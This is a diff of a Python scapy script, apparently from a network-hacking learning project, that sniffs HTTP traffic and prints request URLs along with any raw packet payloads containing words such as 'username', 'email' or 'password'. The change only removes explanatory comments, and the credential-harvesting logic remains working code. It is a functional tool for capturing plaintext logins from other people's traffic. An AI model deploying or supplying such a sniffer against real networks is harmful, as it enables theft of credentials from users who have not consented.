@@ -14,25 +14,24 @@ def parsing():
 
 
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  # not to store any packets on the computer to not cause much load on it | prn is a call function when any packet is sniffed by this line, means that each packet will be captured will call another function specified by the prn argument
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
 def get_login(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
-        keywords = ["username", "login", "email", "password", "Password"]  # if you found any of these keywords in the Raw packet show its content, this is done because programmer may not use the word username and use email instead of it
+        keywords = ["username", "login", "email", "password", "Password"]
         for keyword in keywords:
-            if keyword.encode() in load:  # i used .encode() because in python3 it will prompt an error: "TypeError: a bytes-like object is required, not 'str'" so we have to encode it from str to bytes in order to compare it with the load packet
+            if keyword.encode() in load:  
                 return load
 
 
 def get_url(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # we can get the names of the fields in the packet type by printing its packet.show() and fin the argument that has the values that we want to access
-
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):  # if my packet has that layer(HTTP layer) print that packet to me
+    if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> {0}".format(url.decode()))
         login_info = get_login(packet)
